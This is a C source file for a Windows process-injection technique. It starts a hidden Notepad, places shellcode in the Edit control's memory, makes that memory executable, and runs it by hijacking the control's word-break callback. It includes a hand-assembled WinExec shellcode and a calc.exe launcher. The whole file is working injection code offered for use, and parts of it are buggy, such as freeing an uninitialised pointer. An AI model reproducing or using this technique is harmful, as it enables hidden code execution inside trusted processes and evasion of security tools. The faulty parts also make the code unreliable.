/*
* 这里需要根据写入shellcode的API是A还是W，所以shellcode中不能有00 00或者00这种截断
*/

#define UNICODE
#include <windows.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

#define WINEXEC2_SIZE 212

char WINEXEC2[] = {
    /* 0000 */ "\x56"                     /* push      rsi                               */
    /* 0001 */ "\x53"                     /* push      rbx                               */
    /* 0002 */ "\x57"                     /* push      rdi                               */
    /* 0003 */ "\x55"                     /* push      rbp                               */
    /* 0004 */ "\xeb\x0a"                 /* jmp       0x10                              */
    /* 0006 */ "\x59"                     /* pop       rcx                               */
    /* 0007 */ "\x51"                     /* push      rcx                               */
    /* 0008 */ "\x31\xc0"                 /* xor       eax, eax                          */
    /* 000A */ "\xb0\xbf"                 /* mov       al, 0xbf                          */
    /* 000C */ "\x48\x01\xc1"             /* add       rcx, rax                          */
    /* 000F */ "\xc3"                     /* ret                                         */
    /* 0010 */ "\xe8\xf1\xff\xff\xff"     /* call      6                                 */
    /* 0015 */ "\xb0\xc8"                 /* mov       al, 0xc8                          */
    /* 0017 */ "\x48\x29\xc4"             /* sub       rsp, rax                          */
    /* 001A */ "\x51"                     /* push      rcx                               */
    /* 001B */ "\x6a\x60"                 /* push      0x60                              */
    /* 001D */ "\x41\x5b"                 /* pop       r11                               */
    /* 001F */ "\x65\x49\x8b\x03"         /* mov       rax, qword ptr gs:[r11]           */
    /* 0023 */ "\x48\x8b\x40\x18"         /* mov       rax, qword ptr [rax + 0x18]       */
    /* 0027 */ "\x48\x8b\x78\x10"         /* mov       rdi, qword ptr [rax + 0x10]       */
    /* 002B */ "\xeb\x03"                 /* jmp       0x30                              */
    /* 002D */ "\x48\x8b\x3f"             /* mov       rdi, qword ptr [rdi]              */
    /* 0030 */ "\x48\x8b\x5f\x30"         /* mov       rbx, qword ptr [rdi + 0x30]       */
    /* 0034 */ "\x8b\x73\x3c"             /* mov       esi, dword ptr [rbx + 0x3c]       */
    /* 0037 */ "\x44\x01\xde"             /* add       esi, r11d                         */
    /* 003A */ "\x8b\x4c\x33\x28"         /* mov       ecx, dword ptr [rbx + rsi + 0x28] */
    /* 003E */ "\x67\xe3\xec"             /* jecxz     0x2d                              */
    /* 0041 */ "\x48\x8d\x74\x0b\x18"     /* lea       rsi, qword ptr [rbx + rcx + 0x18] */
    /* 0046 */ "\xad"                     /* lodsd     eax, dword ptr [rsi]              */
    /* 0047 */ "\x91"                     /* xchg      eax, ecx                          */
    /* 0048 */ "\x67\xe3\xe2"             /* jecxz     0x2d                              */
    /* 004B */ "\xad"                     /* lodsd     eax, dword ptr [rsi]              */
    /* 004C */ "\x41\x90"                 /* xchg      eax, r8d                          */
    /* 004E */ "\x49\x01\xd8"             /* add       r8, rbx                           */
    /* 0051 */ "\xad"                     /* lodsd     eax, dword ptr [rsi]              */
    /* 0052 */ "\x95"                     /* xchg      eax, ebp                          */
    /* 0053 */ "\x48\x01\xdd"             /* add       rbp, rbx                          */
    /* 0056 */ "\xad"                     /* lodsd     eax, dword ptr [rsi]              */
    /* 0057 */ "\x41\x91"                 /* xchg      eax, r9d                          */
    /* 0059 */ "\x49\x01\xd9"             /* add       r9, rbx                           */
    /* 005C */ "\x8b\x74\x8d\xfc"         /* mov       esi, dword ptr [rbp + rcx*4 - 4]  */
    /* 0060 */ "\x48\x01\xde"             /* add       rsi, rbx                          */
    /* 0063 */ "\x31\xc0"                 /* xor       eax, eax                          */
    /* 0065 */ "\x99"                     /* cdq                                         */
    /* 0066 */ "\xac"                     /* lodsb     al, byte ptr [rsi]                */
    /* 0067 */ "\x01\xc2"                 /* add       edx, eax                          */
    /* 0069 */ "\xc1\xca\x08"             /* ror       edx, 8                            */
    /* 006C */ "\xfe\xc8"                 /* dec       al                                */
    /* 006E */ "\x79\xf6"                 /* jns       0x66                              */
    /* 0070 */ "\x81\xfa\x47\x9a\x92\x1b" /* cmp       edx, 0x1b929a47                   */
    /* 0076 */ "\xe0\xe4"                 /* loopne    0x5c                              */
    /* 0078 */ "\x75\xb3"                 /* jne       0x2d                              */
    /* 007A */ "\x41\x0f\xb7\x04\x49"     /* movzx     eax, word ptr [r9 + rcx*2]        */
    /* 007F */ "\x41\x8b\x04\x80"         /* mov       eax, dword ptr [r8 + rax*4]       */
    /* 0083 */ "\x48\x01\xc3"             /* add       rbx, rax                          */
    /* 0086 */ "\x5a"                     /* pop       rdx                               */
    /* 0087 */ "\x4d\x31\xc0"             /* xor       r8, r8                            */
    /* 008A */ "\x4d\x31\xc9"             /* xor       r9, r9                            */
    /* 008D */ "\x31\xc0"                 /* xor       eax, eax                          */
    /* 008F */ "\x48\x89\x44\x24\x20"     /* mov       qword ptr [rsp + 0x20], rax       */
    /* 0094 */ "\x48\x89\x44\x24\x28"     /* mov       qword ptr [rsp + 0x28], rax       */
    /* 0099 */ "\x48\x89\x44\x24\x30"     /* mov       qword ptr [rsp + 0x30], rax       */
    /* 009E */ "\x48\x89\x44\x24\x38"     /* mov       qword ptr [rsp + 0x38], rax       */
    /* 00A3 */ "\x48\x8d\x7c\x24\x50"     /* lea       rdi, qword ptr [rsp + 0x50]       */
    /* 00A8 */ "\x48\x89\x7c\x24\x48"     /* mov       qword ptr [rsp + 0x48], rdi       */
    /* 00AD */ "\x48\x8d\x7c\x24\x60"     /* lea       rdi, qword ptr [rsp + 0x60]       */
    /* 00B2 */ "\x48\x89\x7c\x24\x40"     /* mov       qword ptr [rsp + 0x40], rdi       */
    /* 00B7 */ "\x31\xc9"                 /* xor       ecx, ecx                          */
    /* 00B9 */ "\x6a\x68"                 /* push      0x68                              */
    /* 00BB */ "\x58"                     /* pop       rax                               */
    /* 00BC */ "\xab"                     /* stosd     dword ptr [rdi], eax              */
    /* 00BD */ "\x48\x83\xe8\x04"         /* sub       rax, 4                            */
    /* 00C1 */ "\x91"                     /* xchg      eax, ecx                          */
    /* 00C2 */ "\xf3\xaa"                 /* rep stosb byte ptr [rdi], al                */
    /* 00C4 */ "\xff\xd3"                 /* call      rbx                               */
    /* 00C6 */ "\x31\xc0"                 /* xor       eax, eax                          */
    /* 00C8 */ "\xb0\xc8"                 /* mov       al, 0xc8                          */
    /* 00CA */ "\x48\x01\xc4"             /* add       rsp, rax                          */
    /* 00CD */ "\x31\xc0"                 /* xor       eax, eax                          */
    /* 00CF */ "\x5d"                     /* pop       rbp                               */
    /* 00D0 */ "\x5f"                     /* pop       rdi                               */
    /* 00D1 */ "\x5b"                     /* pop       rbx                               */
    /* 00D2 */ "\x5e"                     /* pop       rsi                               */
    /* 00D3 */ "\xc3"                     /* ret                                         */
};

#define NOTEPAD_PATH L"%SystemRoot%\\system32\\notepad.exe"

VOID em_inject(PUCHAR shellcode) 
{
    HWND                npw, ecw;
    PVOID               emh, embuf;
    SIZE_T              rd;
    DWORD               old;
    PBYTE               cs;
    WCHAR               path[MAX_PATH];
    PROCESS_INFORMATION pi;
    STARTUPINFO         si;

    // execute notepad and wait for it to initialize
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ExpandEnvironmentStrings(NOTEPAD_PATH, path, MAX_PATH);
    
    CreateProcess(
        path, 
        NULL, 
        NULL, 
        NULL,
        FALSE, 
        0, 
        NULL, 
        NULL, 
        &si, 
        &pi
    );

    WaitForInputIdle(pi.hProcess, INFINITE);

    /*
    // setup shellcode with user-supplied command
    cmd_len = wcslen(cmd) * 2;
    cs = calloc(sizeof(BYTE), WINEXEC2_SIZE + cmd_len + 2);
    
    memcpy(cs, WINEXEC2, WINEXEC2_SIZE);
    memcpy(&cs[WINEXEC2_SIZE], cmd, cmd_len);
    */


    // send the shellcode to Edit control and wait for it to be processed
    npw = FindWindow(L"Notepad", NULL);
    ecw = FindWindowEx(npw, NULL, L"Edit", NULL);
    
    SendMessage(ecw, WM_SETTEXT, 0, (LPARAM)shellcode);
    WaitForInputIdle(pi.hProcess, INFINITE);

    // read the address of memory for edit control
    emh = (PVOID)SendMessage(ecw, EM_GETHANDLE, 0, 0);
    ReadProcessMemory(pi.hProcess, emh, &embuf, sizeof(ULONG_PTR), &rd);
    VirtualProtectEx(pi.hProcess, embuf, 4096, PAGE_EXECUTE_READWRITE, &old);

    // execute shellcode
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)embuf);
    SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);

    // cleanup and exit
    free(cs);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int eminjectExecute() 
{
    unsigned char shellcode[] = {
        // 构建"calc.exe"字符串到栈上
        0x48, 0x31, 0xC0,               // xor rax, rax
        0x50,                           // push rax        ; null terminator
        0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
        0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"

        // 设置参数并调用
        0x48, 0x89, 0xE1,               // mov rcx, rsp    ; 第一个参数
        0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
        0x5A,                           // pop rdx         ; 第二个参数

        // 调用WinExec
        0x48, 0xB8,                     // mov rax,
        0xEF, 0xBE, 0xAD, 0xDE,        // WinExec地址
        0xEF, 0xBE, 0xAD, 0xDE,        // (需要填充)
        0x48, 0xF7, 0xD0,               // not rax
        0xFF, 0xD0                      // call rax
    };
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");
    // 填充WinExec地址
    *(UINT64*)(shellcode + 22) = ~WinExecAddr;

    em_inject(shellcode);

    return 0;
}